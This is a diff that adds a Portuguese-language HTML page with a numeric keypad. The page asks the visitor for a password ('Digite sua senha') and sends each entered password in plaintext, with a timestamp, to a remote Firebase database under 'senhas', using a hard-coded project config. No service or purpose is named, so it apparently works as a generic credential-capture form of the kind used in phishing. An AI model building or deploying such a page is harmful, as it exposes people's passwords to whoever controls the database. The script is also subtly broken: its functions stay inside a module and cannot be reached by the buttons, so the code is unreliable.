@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Senha Numérica</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 50px;
+      background: #121212;
+      color: white;
+    }
+    .teclado button {
+      width: 60px;
+      height: 60px;
+      margin: 10px;
+      font-size: 24px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      background: #4fc3f7;
+      color: #121212;
+      font-weight: bold;
+      transition: background 0.3s;
+    }
+    .teclado button:hover {
+      background: #3a9bdc;
+    }
+    #senha {
+      font-size: 32px;
+      margin: 20px;
+      letter-spacing: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Digite sua senha:</h1>
+  <div id="senha"></div>
+  <div class="teclado">
+    <button onclick="digitar('1')">1</button>
+    <button onclick="digitar('2')">2</button>
+    <button onclick="digitar('3')">3</button><br>
+    <button onclick="digitar('4')">4</button>
+    <button onclick="digitar('5')">5</button>
+    <button onclick="digitar('6')">6</button><br>
+    <button onclick="digitar('7')">7</button>
+    <button onclick="digitar('8')">8</button>
+    <button onclick="digitar('9')">9</button><br>
+    <button onclick="apagar()">←</button>
+    <button onclick="digitar('0')">0</button>
+    <button onclick="enviar()">OK</button>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+    import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyB9s6G9lmpTmZEhH9jXdKP8-EagsvEHrf0",
+      authDomain: "senhapadrao-e0c64.firebaseapp.com",
+      projectId: "senhapadrao-e0c64",
+      storageBucket: "senhapadrao-e0c64.firebasestorage.app",
+      messagingSenderId: "653510904734",
+      appId: "1:653510904734:web:a900204d66b5396bb3a48f",
+      measurementId: "G-QY23L56RZK"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    let senha = '';
+
+    function atualizarVisual() {
+      document.getElementById('senha').textContent = '*'.repeat(senha.length);
+    }
+
+    function digitar(num) {
+      if (senha.length < 10) { // limite de 10 dígitos (pode mudar)
+        senha += num;
+        atualizarVisual();
+      }
+    }
+
+    function apagar() {
+      senha = senha.slice(0, -1);
+      atualizarVisual();
+    }
+
+    async function enviar() {
+      if (senha.length === 0) {
+        alert('Digite sua senha antes de enviar.');
+        return;
+      }
+      try {
+        const senhasRef = ref(db, 'senhas');
+        await push(senhasRef, {
+          senha: senha,
+          timestamp: serverTimestamp()
+        });
+        alert('Senha enviada com sucesso!');
+        senha = '';
+        atualizarVisual();
+      } catch (e) {
+        alert('Erro ao enviar a senha: ' + e.message);
+      }
+    }
+
+    atualizarVisual();
+  </script>
+</body>
+</html>
